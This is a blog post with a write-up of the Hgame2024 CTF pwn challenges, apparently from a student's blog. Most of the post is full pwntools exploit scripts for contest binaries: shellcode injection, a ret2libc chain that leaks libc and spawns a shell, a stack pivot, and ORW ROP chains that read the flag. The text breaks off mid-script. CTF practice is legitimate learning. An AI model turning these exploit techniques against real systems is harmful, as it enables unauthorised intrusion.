

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/cat2.png">
  <link rel="icon" href="/img/cat2.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="yech0">
  <meta name="keywords" content="">
  
    <meta name="description" content="week1pwn0 签到 直接nc  1 ezshellcode 明文shellcode 12345678910from pwn import *# io &#x3D; process(&quot;.&#x2F;vuln&quot;)io &#x3D; remote(&quot;47.100.139.115&quot;,31134)io.sendlineafter(&quot;length of your shellcode:">
<meta property="og:type" content="article">
<meta property="og:title" content="Hgame2024复现">
<meta property="og:url" content="https://yech0.github.io/2024/03/23/Hgame2024/index.html">
<meta property="og:site_name" content="YEch0&#39;s Blog">
<meta property="og:description" content="week1pwn0 签到 直接nc  1 ezshellcode 明文shellcode 12345678910from pwn import *# io &#x3D; process(&quot;.&#x2F;vuln&quot;)io &#x3D; remote(&quot;47.100.139.115&quot;,31134)io.sendlineafter(&quot;length of your shellcode:">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-03-23T08:00:51.753Z">
<meta property="article:modified_time" content="2024-05-05T08:05:31.387Z">
<meta property="article:author" content="yech0">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Hgame2024复现 - YEch0&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yech0.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 100vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>YEch0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/bj3.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Hgame2024复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-23 16:00" pubdate>
          2024年3月23日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          67k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          559 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Hgame2024复现</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="0-签到"><a href="#0-签到" class="headerlink" title="0 签到"></a>0 签到</h4><ul>
<li>直接nc</li>
</ul>
<h4 id="1-ezshellcode"><a href="#1-ezshellcode" class="headerlink" title="1 ezshellcode"></a>1 ezshellcode</h4><ul>
<li><p>明文shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;47.100.139.115&quot;</span>,<span class="hljs-number">31134</span>)<br><br>io.sendlineafter(<span class="hljs-string">&quot;length of your shellcode:&quot;</span>, <span class="hljs-string">b&#x27;-1&#x27;</span>)<br>shellcode = <span class="hljs-string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>io.sendafter(<span class="hljs-string">&quot;shellcode:&quot;</span>, shellcode)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-Elden-Random-Challenge"><a href="#2-Elden-Random-Challenge" class="headerlink" title="2 Elden Random Challenge"></a>2 Elden Random Challenge</h4><ul>
<li><p>伪随机数+ret2libc<br>libc本地得到的不对 然后打远程本来也没想着能通来着 结果通了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;47.100.139.115&quot;</span>, <span class="hljs-number">32002</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>vuln_addr = <span class="hljs-number">0x40125d</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)<br><br>io.sendlineafter(<span class="hljs-string">&quot;name.&quot;</span>, <span class="hljs-string">b&#x27;yech0&#x27;</span>)<br><br>libc.srand(libc.time(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># while True:</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">99</span>):<br>    num = libc.rand()%<span class="hljs-number">100</span>+<span class="hljs-number">1</span><br>    io.sendafter(<span class="hljs-string">&quot;number:&quot;</span>, <span class="hljs-built_in">int</span>.to_bytes(num, <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br><br><span class="hljs-comment"># lib = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>lib = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0000000000401423</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>io.sendafter(<span class="hljs-string">&quot;mind.&quot;</span>, payload)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>libc_base = puts_addr - lib.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># libc_base = puts_addr - (0x7f8fd9379420-0x7f8fd92f5000)</span><br>system = libc_base + lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-comment"># libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="hljs-comment"># system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="hljs-comment"># binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ogg = [0xe3b2e, 0xe3b31, 0xe3b34]</span><br><span class="hljs-comment"># onegadget = libc_base + ogg[2]</span><br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br><span class="hljs-comment"># payload2 = b&#x27;\x00&#x27;*(0x30) + p64(0) +  p64(onegadget)</span><br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-Elden-Ring-Ⅰ"><a href="#3-Elden-Ring-Ⅰ" class="headerlink" title="3 Elden Ring Ⅰ"></a>3 Elden Ring Ⅰ</h4><ul>
<li><p>开了沙箱禁了execve 栈迁移打orw来着 但不到为啥就卡在shellcode那不执行(段错误)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;47.102.130.35&quot;, 32258)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)<br>leave_ret = <span class="hljs-number">0x0000000000401290</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>read = <span class="hljs-number">0x401276</span><br>bss = <span class="hljs-number">0x4044f0</span><br>addr = <span class="hljs-number">0x404700</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(bss) + p64(read)<br>io.send(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-comment"># shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment"># shellcode += shellcraft.read(3, addr, 0x50)</span><br><span class="hljs-comment"># shellcode += shellcraft.write(1, addr, 0x50)</span><br><span class="hljs-comment"># shellcode = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     push 0x67616c66;</span><br><span class="hljs-comment">#     mov rdi,rsp;</span><br><span class="hljs-comment">#     xor esi,esi;</span><br><span class="hljs-comment">#     push 2;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     push 3;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     mov rdi,rax;</span><br><span class="hljs-comment">#     mov rsi,[rsp+0x200];</span><br><span class="hljs-comment">#     mov edx,0x100;</span><br><span class="hljs-comment">#     xor eax,eax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     mov edi,1;</span><br><span class="hljs-comment">#     mov rsi,[rsp+0x200];</span><br><span class="hljs-comment">#     push 1;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#  push 0x67616c66</span><br><span class="hljs-comment">#  mov rdi,rsp</span><br><span class="hljs-comment">#  xor esi,esi</span><br><span class="hljs-comment">#  push 2</span><br><span class="hljs-comment">#  pop rax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  mov rdi,rax</span><br><span class="hljs-comment">#  mov rsi,rsp</span><br><span class="hljs-comment">#  mov edx,0x100</span><br><span class="hljs-comment">#  xor eax,eax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  mov edi,1</span><br><span class="hljs-comment">#  mov rsi,rsp</span><br><span class="hljs-comment">#  push 1</span><br><span class="hljs-comment">#  pop rax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  &#x27;&#x27;&#x27;)</span><br>gdb.attach(io)<br>pause()<br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment"># payload2 = b&#x27;b&#x27;*(0x100) + p64(bss+0x100) + p64(read)</span><br>payload2 = shellcode.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(ret) + p64(<span class="hljs-number">0x4043f0</span>)<br>io.send(payload2)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># payload3 = p64(ret) + p64(0x404500) + shellcode</span><br><span class="hljs-comment"># io.sendline(payload3)</span><br><span class="hljs-comment"># io.send(b&#x27;ccc&#x27;)</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<ul>
<li>找到一个师傅的wp  可能真是bss段没有权限的问题（之前那个栈迁移的题可以执行可能是因为本题有<code>setvbuf(_bss_start, 0LL, 2, 0LL);</code> 那题是没有的<br>师傅用了mprotect函数就能通</li>
</ul>
<hr>
</li>
<li><p>师傅们用的都是泄露libc 用libc中的gadget实现read向bss中写 而且不能是shellcode 没执行权限嘛 用gadget写orw(ret2libc那种)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 好奇怪 换了libc成9.7的 但找offset还是要原来的libc才对</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32447</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401292</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br><br>payload2 = off<br>payload2 += p64(rsi) + p64(addr) + p64(read)<br>payload2 += p64(rsp) + p64(addr+<span class="hljs-number">8</span>)<br>io.send(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br><span class="hljs-comment"># payload3 += p64(main)		# chenxi师傅加了ret_addr 不加也能通</span><br>io.send(payload3)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;D0_yoU_F4ncy_7he_E1d3nR1ng?I_D0!&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span 